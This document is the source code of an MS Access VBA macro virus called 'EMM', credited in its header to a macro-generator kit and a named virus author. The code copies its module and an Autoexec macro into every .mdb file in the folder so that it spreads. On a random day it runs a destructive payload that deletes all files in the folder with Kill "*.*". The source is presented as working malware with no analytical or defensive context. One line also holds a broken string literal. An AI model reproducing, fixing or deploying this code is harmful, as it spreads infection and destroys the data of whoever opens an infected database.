   '  Access Macro Generator by ULTRAS
   '          Version 1.0

   'Virus Name: EMM
   'Virus Author: PetiK
   '09/11/2009 13:29:18

   Option Compare Database
   Option Explicit

   Function  amg()
   On Error Resume Next
   Dim Fname, Virii, CBase As String
   Virii = False
   Fname = Dir("*.mdb", vbNormal)
   If Fname <> "" Then
   CBase = CurrentDb.Name
   If CBase = Fname Then Virii = True
   If Virii = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", Fname, acModule, "emm", "emm"
   If Virii = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", Fname, acMacro, "Autoexec", "Autoexec "
   While Fname <> "
   Fname = Dir
   If CBase = Fname Then Virii = True
   If Virii = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", Fname, acModule, "emm", "emm"
   If Virii = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", Fname, acMacro, "Autoexec", "Autoexec "
   Wend
   Call Payload
   End If
   End Function

   Sub Payload
   On Error Resume Next
   If Day(Now()) = Int(Rnd() * 30) + 1 Then
   Kill "*.*"
   End If
   End Sub
